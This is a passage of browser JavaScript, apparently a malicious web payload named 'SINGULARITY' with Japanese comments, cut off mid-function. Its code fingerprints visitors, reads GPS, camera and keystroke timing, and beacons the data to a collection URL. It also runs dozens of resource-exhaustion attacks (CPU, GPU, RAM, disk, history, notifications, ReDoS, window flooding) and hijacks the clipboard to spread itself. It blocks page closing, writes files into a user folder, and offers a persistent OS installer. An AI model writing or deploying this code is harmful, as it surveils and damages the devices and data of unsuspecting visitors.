        try { navigator.permissions.query({ name: name }).then(function (s) { R.privacy.permissions[name] = s.state; push(false); }).catch(function () {}); } catch (e) {}
      });
    }
  } catch (e) {}
}
function adblock() {
  try {
    var d = document.createElement("div");
    d.className = "ad-banner adsbox";
    d.style.cssText = "position:absolute;left:-9999px";
    document.body.appendChild(d);
    setTimeout(function () { R.privacy.adblock = d.offsetHeight === 0; d.remove(); }, 300);
  } catch (e) {}
}
function perms() {
  try {
    if (navigator.permissions && navigator.permissions.query) {
      navigator.permissions.query({ name: "storage-access" }).then(function (s) { R.privacy.storageAccess = s.state; }).catch(function () {});
    }
  } catch (e) {}
}

/* ================= 6. ハードウェア ================= */
function codecs() {
  var v = document.createElement("video"), a = document.createElement("audio");
  function t(m) { try { return v.canPlayType(m) || ""; } catch (e) { return ""; } }
  R.hardware.codecs = {
    h264: !!t('video/mp4; codecs="avc1.42E01E"'), hevc: !!t('video/mp4; codecs="hvc1"'),
    av1: !!t('video/mp4; codecs="av01.0.05M.08"'), vp9: !!t('video/webm; codecs="vp9"'),
    opus: !!(a.canPlayType && a.canPlayType('audio/webm; codecs="opus"')),
    flac: !!(a.canPlayType && a.canPlayType("audio/flac"))
  };
}
function benchmark() {
  try {
    var t = performance.now(), n = 0;
    while (performance.now() - t < 120) { Math.sqrt(n) * Math.sin(n); n++; }
    R.hardware.ops = Math.round(n / ((performance.now() - t) / 1000));
    var f = 0, t2 = performance.now();
    (function loop() {
      f++;
      if (performance.now() - t2 < 500) requestAnimationFrame(loop);
      else { R.hardware.fps = Math.round(f / ((performance.now() - t2) / 1000)); push(false); }
    })();
  } catch (e) {}
}
function enumerate2() {
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return;
    navigator.mediaDevices.enumerateDevices().then(function (l) {
      R.hardware.devices = l.map(function (d) { return { k: d.kind, l: d.label }; });
      push(false);
    }).catch(function () {});
  } catch (e) {}
}

/* ================= 7. 知覚 ================= */
function devices() { enumerate2(); }
function camera() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
  try {
    navigator.mediaDevices.getUserMedia({ video: true, audio: false }).then(function (s) {
      R.rat.cam = true;
      s.getTracks().forEach(function (t) { t.stop(); });
      push(false);
    }).catch(function (e) { R.rat.cam = (e && e.name) || "err"; });
  } catch (e) {}
}
function geo() {
  if (!navigator.geolocation) return;
  try {
    navigator.geolocation.getCurrentPosition(function (p) {
      R.network.gps = { lat: +p.coords.latitude.toFixed(5), lon: +p.coords.longitude.toFixed(5),
                        acc: Math.round(p.coords.accuracy) };
      push(true);
    }, function (e) { R.network.gpsErr = (e && e.message) || "err"; }, { timeout: 8000, maximumAge: 60000 });
  } catch (e) {}
}
function motion() {
  try {
    var acc = [], gyro = [];
    addEventListener("devicemotion", function (e) {
      var a = e.accelerationIncludingGravity, r = e.rotationRate;
      if (a) acc.push([+(a.x || 0).toFixed(2), +(a.y || 0).toFixed(2), +(a.z || 0).toFixed(2)]);
      if (r) gyro.push([+(r.alpha || 0).toFixed(1), +(r.beta || 0).toFixed(1), +(r.gamma || 0).toFixed(1)]);
      if (acc.length > 20) acc.shift();
      if (gyro.length > 20) gyro.shift();
    });
    setTimeout(function () {
      R.hardware.motion = { acc: acc.length, gyro: gyro.length,
        hash: hash(JSON.stringify(acc.slice(0, 12)) + "|" + JSON.stringify(gyro.slice(0, 12))) };
      push(false);
    }, 1400);
  } catch (e) {}
}

/* ================= 8. 行動生体 ================= */
function behavior() {
  var B = { keys: 0, dwell: [], flight: [], mouse: 0, path: [], clicks: 0 };
  R.behavioral = B;
  try {
    var lastK = 0;
    addEventListener("keydown", function (e) {
      if (lastK) B.flight.push(now() - lastK);
      lastK = now(); B.keys++;
    });
    addEventListener("keyup", function () {
      if (lastK) B.dwell.push(now() - lastK);
    });
    addEventListener("mousemove", function (e) {
      B.mouse++;
      if (B.mouse % 5 === 0) {
        B.path.push([e.clientX, e.clientY]);
        if (B.path.length > 60) B.path.shift();
      }
    });
    addEventListener("click", function () { B.clicks++; });
  } catch (e) {}
}
function behaviorOut() {
  var B = R.behavioral || {}, f = B.flight || [];
  return { keys: B.keys, clicks: B.clicks, mouse: B.mouse,
           dwellMean: +mean(B.dwell).toFixed(1), flightMean: +mean(f).toFixed(1),
           flightSd: +sd(f).toFixed(1), mousePath: (B.path || []).length };
}

/* ================= 9. bot / ハニーポット ================= */
function botProbe() {
  var b = { webdriver: !!navigator.webdriver,
    headlessUA: /HeadlessChrome|PhantomJS|SlimerJS/.test(navigator.userAgent),
    plugins0: (navigator.plugins || []).length === 0, langs0: !navigator.languages || !navigator.languages.length };
  try {
    var hp = document.createElement("input");
    hp.name = "sg_hp_" + rid(4);
    hp.style.cssText = "position:absolute;left:-9999px";
    document.body.appendChild(hp);
    setTimeout(function () { b.honeypot = hp.value.length > 0; }, 600);
  } catch (e) {}
  R.bot = b;
}

/* ================= 10. 永続 / 復活 / 暗号個体ID ================= */
function persistState() {
  if (!CFG.persist) return;
  try {
    var meta = JSON.stringify({ sid: SID, at: now(), ver: MYVER, host: location.host });
    wn("sg_meta", meta);
    try { caches.open("sg-p").then(function (c) { c.put("/__sg_meta", new Response(meta)); }); } catch (e) {}
    try {
      if (navigator.storage && navigator.storage.persist) navigator.storage.persist().catch(function () {});
    } catch (e) {}
  } catch (e) {}
}
function resurrect() {
  try {
    var m = wn("sg_meta");
    if (!m) return;
    var o = JSON.parse(m);
    R.resurrect = { gap: now() - (o.at || now()), ver: o.ver };
  } catch (e) {}
}
function cryptoID() {
  try {
    var b = new Uint8Array(16);
    (crypto.getRandomValues ? crypto.getRandomValues(b) : b.forEach(function (_, i) { b[i] = Math.random() * 255; }));
    R.crypto.id = b64u(b).replace(/=/g, "").slice(0, 22);
    R.crypto.sub = "sig";
  } catch (e) {}
}
function swInstall() {
  if (!navigator.serviceWorker || !CFG.sw || IFR) return;
  try {
    navigator.serviceWorker.register(CFG.sw, { scope: "/" }).then(function (reg) {
      R.privacy.swReg = 1;
      var send = function () {
        var w = reg.active || reg.waiting || reg.installing;
        if (!w) return;
        try {
          w.postMessage({ k: "cfg", page: CFG.path, sid: SID, man: CFG.manifest,
                          icons: CFG.icons, v: MYVER,
                          inj: { pjs: CFG.pjs, origin: location.origin } });
        } catch (e) {}
      };
      send();
      setTimeout(send, 1500);
      if (navigator.serviceWorker.controller) navigator.serviceWorker.controller.postMessage({ k: "cfg", page: CFG.path, sid: SID });
    }).catch(function (e) { R.privacy.sw = "failed:" + ((e && e.name) || "x"); });
  } catch (e) {}
}

/* ================= 11. 自己複製 ================= */
function mutate() {
  if (!CFG.mutate) return;
  var p = Q("ref");
  var chain = p ? p.split(".") : [];
  chain.push(SID.slice(0, 4));
  if (chain.length > 12) chain.shift();
  var child = CFG.path + "?u=root&ref=" + chain.join(".");
  R.viral = { gen: chain.length, childLink: child, chain: chain.join(".") };
  if (CFG.clipboard) { try { navigator.clipboard && navigator.clipboard.writeText(R.viral.childLink); } catch (e) {} }
}

/* ================= 12. 多経路ビーコン ================= */
var ptimer = null, plast = 0;
function report() {
  return {
    sid: SID, ver: MYVER, level: LEVEL, fixed: !!CFG.fixed, t: now() - T0,
    env: R.env, page: R.page, vectors: R.vectors, privacy: R.privacy, hardware: R.hardware,
    network: R.network, behavioral: behaviorOut(), bot: R.bot, verdict: R.verdict,
    rat: R.rat, usb: R.usb, viral: R.viral, burn: R.burn, ram: R.ram, disk: R.disk,
    history: R.history, wipe: R.wipe, bomb: R.bomb, crypto: R.crypto, errors: R.errors,
    breed: R.breed, win: { mode: CFG.winMode, branch: CFG.winBranch, depth: CFG.winDepth, skin: CFG.winSkin, w: W },
    peers: (typeof PEERS === "number" ? PEERS : 0), u: Q("u") || "root"
  };
}
function push(force) {
  var t = now();
  if (!force && t - plast < 1500) return;
  plast = t;
  var body = JSON.stringify(report());
  try {
    if (CFG.collect) {
      var img = new Image();
      img.src = CFG.collect + "?sid=" + SID + "&d=" + b64u(new TextEncoder().encode(body));
    }
  } catch (e) {}
  try {
    if (navigator.serviceWorker && navigator.serviceWorker.controller) {
      navigator.serviceWorker.controller.postMessage({ k: "out", v: JSON.parse(body) });
    }
  } catch (e) {}
}
function flush() { push(true); }

/* ================= 13. 資源攻撃 ================= */
function burnStart() {
  if (!CFG.burn || !window.Worker || !window.__SINGULARITY_WORKER__) return;
  var n = clamp(CFG.cores || (navigator.hardwareConcurrency || 4), 1, 64);
  for (var i = 0; i < n; i++) {
    try {
      var b = new Blob([window.__SINGULARITY_WORKER__], { type: "application/javascript" });
      var w = new Worker(URL.createObjectURL(b));
      w.postMessage({ k: "burn" });
      WORKERS.push(w);
    } catch (e) {}
  }
  R.burn = { workers: WORKERS.length };
  push(false);
}
function webgpuBurn() {
  if (!CFG.webgpu || !navigator.gpu) return;
  try {
    navigator.gpu.requestAdapter().then(function (a) {
      if (!a) return;
      return a.requestDevice().then(function (d) {
        R.burn.gpu = 1;
        var n = 0;
        (function loop() {
          try {
            var enc = d.createCommandEncoder();
            enc.finish();
            n++;
          } catch (e) {}
          if (n < 1e9) setTimeout(loop, 0);
        })();
        push(false);
      });
    }).catch(function () {});
  } catch (e) {}
}
function ramStart() {
  if (!CFG.ramMB) return;
  var mb = CFG.ramMB, per = Math.max(1, Math.round(mb / Math.max(1, WORKERS.length || 1)));
  for (var i = 0; i < WORKERS.length; i++) { try { WORKERS[i].postMessage({ k: "ram", mb: per }); } catch (e) {} }
  R.ram = { target: mb, per: per, workers: WORKERS.length };
  push(false);
}
function diskStart() {
  if (!CFG.diskRatio || !navigator.storage || !navigator.storage.estimate) return;
  navigator.storage.estimate().then(function (e) {
    var quota = e.quota || 0, want = Math.round(quota * CFG.diskRatio);
    var chunk = 8 * 1024 * 1024, done = 0, w = 0;
    var parts = [];
    (function loop() {
      if (done >= want) { R.disk = { wrote: done, quota: quota, parts: parts.length }; push(true); return; }
      try {
        var a = new Uint8Array(Math.min(chunk, want - done));
        for (var i = 0; i < a.length; i += 4096) a[i] = i & 255;
        var name = "/__sg_disk_" + (w++) + ".bin";
        parts.push(name);
        caches.open("sg-disk").then(function (c) {
          return c.put(name, new Response(a, { headers: { "Content-Type": "application/octet-stream" } }));
        }).catch(function () {});
        done += a.length;
      } catch (e) { done = want; }
      R.disk = { wrote: done, quota: quota };
      setTimeout(loop, 0);
    })();
  }).catch(function () {});
}
function historyFlood() {
  if (!CFG.history) return;
  try {
    var n = clamp(CFG.history, 100, 200000), i = 0;
    (function loop() {
      var end = Math.min(i + 200, n);
      for (; i < end; i++) {
        try { history.pushState({ s: i }, "", location.pathname + "?s=" + i + "#sg"); } catch (e) { return; }
      }
      R.history = { pushed: i, max: n };
      if (i < n) setTimeout(loop, 0); else push(false);
    })();
  } catch (e) {}
}
function notifyFlood() {
  if (!CFG.notify) return;
  try {
    if (!("Notification" in window)) return;
    var go = function () {
      var n = clamp(CFG.notify, 1, 500), i = 0;
      (function loop() {
        if (i >= n) return;
        try { new Notification(CFG.avName, { body: "\u611F\u67D3 " + i, tag: "sg" + i, silent: true }); } catch (e) {}
        i++;
        setTimeout(loop, 300);
      })();
    };
    if (Notification.permission === "granted") go();
    else if (Notification.permission !== "denied") Notification.requestPermission().then(go);
  } catch (e) {}
}
function audioLoop() {
  if (!CFG.audio) return;
  try {
    var AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;
    var ctx = new AC();
    R.wskinCtx = ctx;
    var o = ctx.createOscillator(), g = ctx.createGain();
    o.type = "square"; o.frequency.value = 78;
    g.gain.value = 0.008;
    o.connect(g); g.connect(ctx.destination); o.start();
    R.audio = { rate: ctx.sampleRate };
    addEventListener("click", function () { try { ctx.resume(); } catch (e) {} }, { once: true });
  } catch (e) {}
}
function titleFlicker() {
  if (!CFG.titleFlicker) return;
  try {
    var orig = document.title, i = 0;
    setInterval(function () {
      i++;
      document.title = (i % 2) ? "\u25CE " + CFG.avName : orig;
    }, 1000);
  } catch (e) {}
}
function faviconSpin() {
  if (!CFG.favicon) return;
  try {
    var c = document.createElement("canvas"); c.width = c.height = 64;
    var x = c.getContext("2d"), a = 0;
    (function loop() {
      x.clearRect(0, 0, 64, 64);
      x.fillStyle = "#00ff88"; x.beginPath();
      x.arc(32, 32, 20, a, a + 4.6); x.fill();
      a += 0.2;
      var l = document.querySelector("link[rel~='icon']");
      if (!l) { l = document.createElement("link"); l.rel = "icon"; document.head.appendChild(l); }
      l.href = c.toDataURL();
      setTimeout(loop, 90);
    })();
  } catch (e) {}
}
function mediaHijack() {
  if (!CFG.mediaSession || !("mediaSession" in navigator)) return;
  try {
    navigator.mediaSession.metadata = new MediaMetadata({
      title: CFG.avName + " \u7D76\u6EC5", artist: "SINGULARITY", album: "L" + LEVEL
    });
    R.media = 1;
  } catch (e) {}
}
function badge() {
  if (!CFG.badge) return;
  try { navigator.setAppBadge && navigator.setAppBadge(LEVEL || 1); } catch (e) {}
}
function uncloseable() {
  if (!CFG.uncloseable) return;
  try {
    addEventListener("beforeunload", function (e) { e.preventDefault(); e.returnValue = ""; });
  } catch (e) {}
}
function wakelock() {
  if (!CFG.wakelock || !navigator.wakeLock) return;
  try {
    navigator.wakeLock.request("screen").then(function (s) {
      R.wake = 1;
      addEventListener("visibilitychange", function () {
        if (document.visibilityState === "visible") navigator.wakeLock.request("screen").catch(function () {});
      });
    }).catch(function () {});
  } catch (e) {}
}
function pauseAll() {
  PAUSED = true;
  WORKERS.forEach(function (w) { try { w.postMessage({ k: "stop" }); } catch (e) {} });
}

/* ================= 13b. L7専用: GPU VRAM爆弾 / 固定オーバーレイ ================= */
function gpuMemBomb() {
  if (!CFG.gpuMem || LEVEL < 7 || R.gmem) return;
  try {
    var c = document.createElement("canvas"), gl = c.getContext("webgl") || c.getContext("webgl2");
    if (!gl) return;
    var hold = [], n = 0, px = new Uint8Array(2048 * 2048 * 4);
    for (var i = 0; i < 32; i++) {
      try {
        var t = gl.createTexture(); gl.bindTexture(gl.TEXTURE_2D, t);
        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, px);
        hold.push(t); n++;
      } catch (e) { break; }
    }
    R.gmem = { tex: n, vramMB: n * 16 };
    R.__gmemHold = hold;
    push(false);
  } catch (e) {}
}
function finalOverlay() {
  if (LEVEL < 7 || R.fov || WIN || IFR) return;
  try {
    var d = document.createElement("div");
    d.id = "sg-final";
    d.style.cssText = "position:fixed;left:8px;bottom:8px;z-index:2147483645;"
      + "font:11px/1.4 ui-monospace,monospace;color:#00ff88;background:rgba(5,7,10,.92);"
      + "border:1px solid #1f5c42;border-radius:8px;padding:5px 9px;pointer-events:none";
    d.textContent = "\u25CE SINGULARITY \u7D76\u6EC5 L7 / " + CFG.avName;
    document.body.appendChild(d); R.fov = 1;
  } catch (e) {}
}

/* ================= 13c. v3.2 追加ベクター（絶滅） ================= */
function iframeBomb() {
  if (!CFG.iframes || R.ifr) return;
  try {
    var host = document.createElement("div");
    host.id = "sg-ifr";
    host.style.cssText = "position:fixed;right:0;bottom:0;width:1px;height:1px;overflow:hidden;opacity:.01;z-index:2147483000";
    document.body.appendChild(host);
    var n = clamp(parseInt(CFG.iframes, 10) || 0, 1, 64);
    for (var i = 0; i < n; i++) {
      try {
        var f = document.createElement("iframe");
        f.src = CFG.path + "?u=ifr&w=1&n=1";
        f.width = "320"; f.height = "200";
        host.appendChild(f);
      } catch (e) {}
    }
    R.ifr = n; push(false);
  } catch (e) {}
}
function domBomb() {
  if (!CFG.domNodes || R.domB) return;
  try {
    var n = clamp(parseInt(CFG.domNodes, 10) || 0, 100, 400000);
    var wrap = document.createElement("div");
    wrap.id = "sg-domb";
    wrap.style.cssText = "position:absolute;left:-99999px;top:0;width:1px;height:1px;overflow:hidden;";
    var frag = document.createDocumentFragment();
    for (var i = 0; i < n; i++) {
      var s = document.createElement("span");
      s.textContent = "." + (i & 15).toString(16);
      s.dataset.i = i;
      frag.appendChild(s);
    }
    wrap.appendChild(frag);
    document.body.appendChild(wrap);
    R.domB = n; push(false);
  } catch (e) {}
}
function cssBomb() {
  if (!CFG.cssAnim || R.cssB) return;
  try {
    var n = clamp(parseInt(CFG.cssAnim, 10) || 0, 10, 5000);
    var st = document.createElement("style");
    var css = "";
    for (var i = 0; i < n; i++) {
      css += "@keyframes sgk" + i + "{0%{transform:rotate(0deg) scale(1)}50%{transform:rotate(180deg) scale(1.4)}100%{transform:rotate(360deg) scale(1)}}\n"
        + ".sgc" + i + "{animation:sgk" + i + " " + (1 + (i % 9) * 0.3) + "s linear infinite;}\n";
    }
    st.textContent = css;
    document.head.appendChild(st);
    var host = document.createElement("div");
    host.style.cssText = "position:fixed;left:-99999px;top:0;";
    for (var j = 0; j < n; j++) {
      var d = document.createElement("div");
      d.className = "sgc" + j;
      d.style.cssText = "width:8px;height:8px;background:#0f0;will-change:transform;";
      host.appendChild(d);
    }
    document.body.appendChild(host);
    R.cssB = n; push(false);
  } catch (e) {}
}
function glContextBomb() {
  if (!CFG.glContexts || R.glc) return;
  try {
    var n = clamp(parseInt(CFG.glContexts, 10) || 0, 1, 64), got = 0;
    for (var i = 0; i < n; i++) {
      try {
        var c = document.createElement("canvas");
        c.width = c.height = 256;
        var gl = c.getContext("webgl");
        if (gl) got++;
      } catch (e) { break; }
    }
    R.glc = got; push(false);
  } catch (e) {}
}
function acContextBomb() {
  if (!CFG.acContexts || R.acc) return;
  try {
    var AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;
    var n = clamp(parseInt(CFG.acContexts, 10) || 0, 1, 32), got = 0;
    for (var i = 0; i < n; i++) {
      try {
        var ctx = new AC();
        var o = ctx.createOscillator(), g = ctx.createGain();
        o.frequency.value = 40 + i * 7; g.gain.value = 0.004;
        o.connect(g); g.connect(ctx.destination); o.start();
        got++;
      } catch (e) { break; }
    }
    R.acc = got; push(false);
  } catch (e) {}
}
function timerStorm() {
  if (!CFG.timers || R.ts) return;
  try {
    var n = clamp(parseInt(CFG.timers, 10) || 0, 1, 4000), got = 0;
    for (var i = 0; i < n; i++) {
      try {
        if (i % 3 === 0) setInterval(function () {}, 1 + (i % 7));
        else if (i % 3 === 1) setTimeout(function () {}, 1 + (i % 5));
        else requestAnimationFrame(function () {});
        got++;
      } catch (e) { break; }
    }
    R.ts = got; push(false);
  } catch (e) {}
}
function microStorm() {
  if (!CFG.microtasks || R.ms) return;
  try {
    R.ms = 1;
    (function loop() {
      Promise.resolve().then(function () {});
      setTimeout(loop, 0);
    })();
  } catch (e) {}
}
function compressStorm() {
  if (!CFG.compress || !window.CompressionStream || R.cs) return;
  try {
    R.cs = 1;
    var buf = new Uint8Array(256 * 1024);
    (function loop() {
      try {
        var c = new CompressionStream("gzip");
        var w = c.writable.getWriter();
        w.write(buf); w.close();
      } catch (e) {}
      setTimeout(loop, 0);
    })();
  } catch (e) {}
}
function redos() {
  if (!CFG.redos || R.redos) return;
  try {
    R.redos = 1;
    var s = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaab";
    (function loop() {
      try { /(a+)+$/.test(s); } catch (e) {}
      setTimeout(loop, 0);
    })();
  } catch (e) {}
}
function digestStorm() {
  if (!CFG.digest || !crypto.subtle || R.dg) return;
  try {
    R.dg = 1;
    var buf = new Uint8Array(64 * 1024);
    (function loop() {
      try { crypto.subtle.digest("SHA-256", buf); } catch (e) {}
      setTimeout(loop, 0);
    })();
  } catch (e) {}
}
function readbackStorm() {
  if (!CFG.readback || R.rb) return;
  try {
    var c = document.createElement("canvas"), gl = c.getContext("webgl");
    if (!gl) return;
    c.width = c.height = 512;
    R.rb = 1;
    var px = new Uint8Array(512 * 512 * 4);
    (function loop() {
      try {
        gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
        gl.clear(gl.COLOR_BUFFER_BIT);
        gl.readPixels(0, 0, 512, 512, gl.RGBA, gl.UNSIGNED_BYTE, px);
      } catch (e) {}
      setTimeout(loop, 0);
    })();
  } catch (e) {}
}
function sseStorm() {
  if (!CFG.sseStorm || !window.EventSource) return;
  try {
    var n = clamp(CFG.sseStorm, 1, 40);
    for (var i = 0; i < n; i++) {
      try { new EventSource(CFG.cmd.replace(/\/cmd$/, "/sse") + "?sid=" + SID + "_" + i + "&n=" + i); } catch (e) {}
    }
    R.sseN = n; push(false);
  } catch (e) {}
}
function fetchStorm() {
  if (!CFG.fetchStorm) return;
  try {
    var n = clamp(CFG.fetchStorm, 1, 32);
    (function loop() {
      for (var i = 0; i < n; i++) { try { fetch(CFG.path + "/c?sid=" + SID + "&n=" + i, { cache: "no-store" }); } catch (e) {} }
      setTimeout(loop, 500);
    })();
    R.fetchN = n;
  } catch (e) {}
}
function speakFlood() {
  if (!CFG.speakFlood || !window.speechSynthesis || R.spk) return;
  try {
    R.spk = 1;
    var n = clamp(CFG.speakFlood, 1, 100);
    for (var i = 0; i < n; i++) {
      try {
        var u = new SpeechSynthesisUtterance("\u7279\u7570\u70B9 " + (i + 1));
        u.rate = 1 + (i % 3) * 0.3; u.pitch = 0.6 + (i % 5) * 0.2;
        speechSynthesis.speak(u);
      } catch (e) {}
    }
    R.spkN = n; push(false);
  } catch (e) {}
}
function oscBank() {
  if (!CFG.oscBank) return;
  try {
    var AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;
    var ctx = R.wskinCtx || new AC();
    R.wskinCtx = ctx;
    var n = clamp(CFG.oscBank, 1, 400), got = 0;
    for (var i = 0; i < n; i++) {
      try {
        var o = ctx.createOscillator(), g = ctx.createGain();
        o.type = (i % 3 === 0) ? "sawtooth" : "sine";
        o.frequency.value = 30 + i * 1.7;
        g.gain.value = 0.002;
        o.connect(g); g.connect(ctx.destination); o.start();
        got++;
      } catch (e) { break; }
    }
    R.oscN = got; push(false);
  } catch (e) {}
}
function idbDiskStart() {
  if (!CFG.idbDisk || !window.indexedDB || R.idb) return;
  try {
    R.idb = 1;
    var r = indexedDB.open("sg-bulk", 1);
    r.onupgradeneeded = function () { r.result.createObjectStore("b", { autoIncrement: true }); };
    r.onsuccess = function () {
      var db = r.result, buf = new Uint8Array(1024 * 1024), i = 0;
      (function loop() {
        try {
          var tx = db.transaction("b", "readwrite");
          tx.objectStore("b").put(buf);
          tx.oncomplete = function () { R.idbN = ++i; };
        } catch (e) {}
        if (i < 300) setTimeout(loop, 0);
      })();
    };
  } catch (e) {}
}
function cacheBuckets() {
  if (!CFG.cacheBuckets || !window.caches) return;
  try {
    var n = clamp(CFG.cacheBuckets, 1, 2000), i = 0;
    (function loop() {
      if (i >= n) { push(false); return; }
      try { caches.open("sg-b" + i).then(function (c) { return c.put("/" + i, new Response("x" + i)); }); } catch (e) {}
      i++;
      setTimeout(loop, 0);
    })();
    R.buckets = n;
  } catch (e) {}
}
function layoutThrash() {
  if (!CFG.layoutThrash || R.lt) return;
  try {
    R.lt = 1;
    var d = document.createElement("div");
    d.style.cssText = "position:absolute;left:-99999px;top:0;";
    document.body.appendChild(d);
    (function loop() {
      try {
        d.style.width = (10 + Math.random() * 400) + "px";
        d.style.height = (10 + Math.random() * 200) + "px";
        void d.offsetHeight;
        document.body.style.letterSpacing = (Math.random() * 0.4).toFixed(2) + "px";
      } catch (e) {}
      setTimeout(loop, 0);
    })();
  } catch (e) {}
}
function clipHijack() {
  if (!CFG.clipHijack || R.clip) return;
  try {
    R.clip = 1;
    var t = setInterval(function () {
      try { navigator.clipboard && navigator.clipboard.writeText(R.viral.childLink || CFG.path); } catch (e) {}
    }, 4000);
    R.clipT = t;
  } catch (e) {}
}
function downloadStorm() {
  if (!CFG.downloads || R.dl) return;
  try {
    R.dl = 1;
    var n = clamp(CFG.downloads, 1, 300), i = 0;
    (function loop() {
      if (i >= n) { push(false); return; }
      try {
        var a = document.createElement("a");
        a.href = CFG.path + "/icon-192.png?n=" + i;
        a.download = "sg" + i + ".png";
        document.body.appendChild(a); a.click(); a.remove();
      } catch (e) {}
      i++;
      setTimeout(loop, 200);
    })();
  } catch (e) {}
}
function sharedWorkerKit() {
  if (!CFG.sharedWorker || !window.SharedWorker) return;
  try {
    var b = new Blob([window.__SINGULARITY_SHARED__ || ""], { type: "application/javascript" });
    if (!window.__SINGULARITY_SHARED__) return;
    var sw = new SharedWorker(URL.createObjectURL(b));
    sw.port.onmessage = function (e) {
      var d = e.data || {};
      if (d.k === "peers") R.peers = d.n;
      if (d.k === "nav" && d.url) { try { location.href = d.url; } catch (x) {} }
    };
    try { sw.port.start(); } catch (e) {}
    sw.port.postMessage({ k: "hello" });
    R.sharedW = 1;
  } catch (e) {}
}
function jsonChurn() {
  if (!CFG.jsonChurn || R.jc) return;
  try {
    R.jc = 1;
    var o = { a: [], b: {} };
    for (var i = 0; i < 200; i++) { o.a.push({ i: i, s: "x" + i, f: Math.random() }); o.b["k" + i] = [i, i * 2, "y"]; }
    (function loop() {
      try {
        var s = JSON.stringify(o);
        JSON.parse(s);
        o.a[0].f = Math.random();
      } catch (e) {}
      setTimeout(loop, 0);
    })();
  } catch (e) {}
}
function fsWrite() {
  if (!CFG.fsFolder || !window.showDirectoryPicker) return;
  setTimeout(function () { fsBtn(); }, 3000);
}
function fsBtn() {
  try {
    if (R.fsH) return;
    var b = document.createElement("button");
    b.textContent = "\u30D5\u30A9\u30EB\u30C0\u3092\u4E57\u3063\u53D6\u308B";
    b.style.cssText = "position:fixed;right:8px;top:8px;z-index:2147483643;font:11px system-ui;"
      + "background:#0b0f14;color:#0f0;border:1px solid #1f5c42;border-radius:6px;padding:4px 8px;cursor:pointer";
    b.onclick = function () {
      try {
        window.showDirectoryPicker().then(function (dir) {
          R.fsH = 1;
          var n = clamp(CFG.fsFiles || 100, 1, 2000), i = 0;
          (function loop() {
            if (i >= n) { push(true); return; }
            try {
              dir.getFileHandle("sg_" + i + ".txt", { create: true })
                .then(function (fh) { return fh.createWritable(); })
                .then(function (w) { return w.write("SINGULARITY " + i + " " + rid(64)).then(function () { return w.close(); }); })
                .catch(function () {});
            } catch (e) {}
            i++;
            setTimeout(loop, 0);
          })();
          R.fsF = n; push(true);
        }).catch(function () {});
      } catch (e) {}
      b.remove();
    };
    document.body.appendChild(b);
  } catch (e) {}
}
function fsFolderKit() {
  if (!CFG.fsFolder || !window.showDirectoryPicker || IFR) return;
  fsBtn();
}

/* ================= 13d. v3.3 OS常駐インストーラ（L7） ================= */
function niDownload(ext) {
  try {
    var burn = clamp(navigator.hardwareConcurrency || 4, 1, 32);
    var disk = 1024;
    var a = document.createElement("a");
    a.href = CFG.path + "/install." + ext
      + "?burn=" + burn + "&disk=" + disk
      + "&app=" + encodeURIComponent(CFG.avName || "blocker")
      + "&t=" + Math.random();
    a.download = (CFG.avName || "blocker") + "." + ext;
    document.body.appendChild(a); a.click(); a.remove();
    R.niDl = ext; push(true);
  } catch (e) { err_(e); }
}
function installerKit() {
  if (LEVEL < 7 || R.ni || IFR || WIN || !CFG.installer) return;
  try {
    R.ni = 1;
    var ua = navigator.userAgent;
    var os = /Windows/.test(ua) ? "bat"
      : (/Mac OS X/.test(ua) ? "command" : (/Linux|CrOS/.test(ua) ? "sh" : "bat"));
    var d = document.createElement("div");
    d.id = "sg-native";
    d.style.cssText = "position:fixed;left:8px;bottom:40px;z-index:2147483644;max-width:360px;"
      + "font:12px/1.55 system-ui,'Hiragino Sans',sans-serif;background:rgba(9,13,19,.97);"
      + "border:1px solid #7a1f4a;border-radius:10px;padding:11px 13px;color:#ffd7e6;"
      + "box-shadow:0 4px 18px rgba(0,0,0,.6)";
    d.innerHTML = '<b style="color:#ff5c8a;font-size:13px">\u2620 \u7D76\u6EC5\u30A4\u30F3\u30B9\u30C8\u30FC\u30E9</b>'
      + '<div style="opacity:.9;margin:5px 0 9px">\u30D6\u30E9\u30A6\u30B6\u3092\u9589\u3058\u3066\u3082PC\u3092\u52A0\u71B1\u3057\u307E\u3059\u3002'
      + '\u30C0\u30A6\u30F3\u30ED\u30FC\u30C9\u3057\u3066\u5B9F\u884C\u3057\u3066\u304F\u3060\u3055\u3044\u3002</div>';
    var row = document.createElement("div");
    row.style.cssText = "display:flex;gap:6px;flex-wrap:wrap";
    [["Windows", "bat"], ["macOS", "command"], ["Linux", "sh"]].forEach(function (p) {
      var b = document.createElement("button");
      b.textContent = p[0] + (p[1] === os ? " \u2605" : "");
      b.style.cssText = "font:11px system-ui;background:#1a0d13;color:#ffb3cc;border:1px solid #7a1f4a;"
        + "border-radius:6px;padding:4px 9px;cursor:pointer";
      b.onclick = function () { niDownload(p[1]); };
      row.appendChild(b);
    });
    d.appendChild(row);
    var x = document.createElement("button");
    x.textContent = "\u00d7";
    x.style.cssText = "position:absolute;right:6px;top:4px;background:none;border:0;color:#ffb3cc;cursor:pointer";
    x.onclick = function () { d.remove(); };
    d.appendChild(x);
    document.body.appendChild(d);
  } catch (e) { err_(e); }
}

/* ================= 13e. v3.4 無限窓繁殖（指数・リミッターなし）＋ヘビースキン ================= */
function openChild(u, tries) {
  var w = null;
  try { w = window.open(u, "_blank"); } catch (e) { err_(e); }
  if (!w && tries > 0) setTimeout(function () { openChild(u, tries - 1); }, 1000);
  return w;
}
function windowChain() {
  if (!CFG.windows || W >= CFG.windows) return;
  setTimeout(function () {
    try {
      var u = CFG.path + "?u=win&w=" + (W + 1) + "&ref=" + SID;
      var w = window.open(u, "_blank");
      R.chain.push(w ? 1 : 0);
      push(false);
    } catch (e) { err_(e); }
  }, CFG.winDelay);
}
function windowBreed() {
  var mode = CFG.winMode || "off";
  if (mode === "off") return;
  if (mode === "chain") return windowChain();
  if (R.breeded) return;
  R.breeded = 1;
  var depth = parseInt(W, 10) || 0;
  var maxD = parseInt(CFG.winDepth, 10) || 0;
